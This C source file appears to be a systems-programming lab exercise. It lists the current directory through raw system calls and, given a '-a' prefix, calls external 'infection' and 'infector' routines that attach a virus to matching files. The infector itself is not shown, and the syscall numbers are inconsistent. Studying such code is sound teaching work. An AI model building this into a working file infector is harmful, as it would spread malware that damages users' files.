#include "util.h"
#include <dirent.h>

#define SYS_WRITE 4
#define STDOUT 1
#define SYS_OPEN 5
#define SYS_CLOSE 6
#define O_RDWR 2
#define SYS_SEEK 19
#define SEEK_SET 0
#define SHIRA_OFFSET 0x291

#define SYS_EXIT 231
#define STATUS_EXIT 0x55

extern int system_call();
extern int infection();
extern int infector();

int main(int argc, char *argv[], char *envp[])
{
    char buffer[8192];
    struct dirent *entry;
    int bytes_read = 0;
    int offset = 0;
    int fd = system_call(SYS_OPEN, ".", 0);
    if (fd == -1)
    {
        system_call(SYS_EXIT, STATUS_EXIT);
    }
    bytes_read = system_call(141, fd, buffer, 8192);
    int attach_virus = 0;
    char *filename;
    int i;
    for (i = 0; i < argc; i++)
    {
        if (strncmp(argv[i], "-a", 2) == 0)
        {
            attach_virus = 1;
            filename = argv[i] + 2;
        }
    }
    infection();

    while (offset < bytes_read)
    {
        entry = buffer + offset;
        system_call(SYS_WRITE, STDOUT, entry->d_name - 1, strlen(entry->d_name - 1));
        if ((attach_virus == 1) && (strncmp(filename, entry->d_name - 1, strlen(filename)) == 0))
        {
            system_call(SYS_WRITE, STDOUT, "\n", 1);
            system_call(SYS_WRITE, STDOUT, "VIRUS ATTACHED", 14);
            infector(filename);
        }
        system_call(SYS_WRITE, STDOUT, "\n", 1);
        offset = offset + entry->d_reclen;
    }

    system_call(SYS_CLOSE, fd);

    return 0;
}
